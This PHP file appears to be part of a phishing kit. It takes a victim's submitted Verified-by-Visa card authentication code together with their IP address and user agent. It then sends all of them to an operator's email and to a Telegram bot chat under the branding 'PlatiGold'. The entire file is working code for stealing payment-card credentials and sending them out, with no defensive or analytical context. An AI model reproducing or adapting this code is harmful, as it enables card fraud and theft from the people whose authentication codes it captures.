<?php
include("../infos.php");
include("../common/sub_includes.php");
include("../common/functions.php");




if(isset($_POST)){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['vbv'] = htmlspecialchars($_POST['vbv']);

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "
		                    
[⚙️] Code VBV [⚙️]

⚙️ Code : ".$_SESSION['vbv']."

[🎆] Additionnal [🎆] 

🎆 Adresse IP : ".$_SESSION['ip']."
🎆 User Agent : ".$_SESSION['useragent']."



					";

					$subject = "[⚙️] + 1 VBV ".$_SESSION['vbv']." - ".$_SESSION['ip'];
					$headers = "From: PlatiGold ⚡️ <signenano@lazone.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[⚙️] Code VBV [⚙️]

⚙️ VBV : '.$_SESSION['vbv'].'

[🎆] Additionnal [🎆] 

🎆 Adresse IP :  '.$_SESSION['ip'].'
🎆 User Agent :  '.$_SESSION['useragent'].'
      


					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}



	}
else{
	header('Location: ../');
}

?>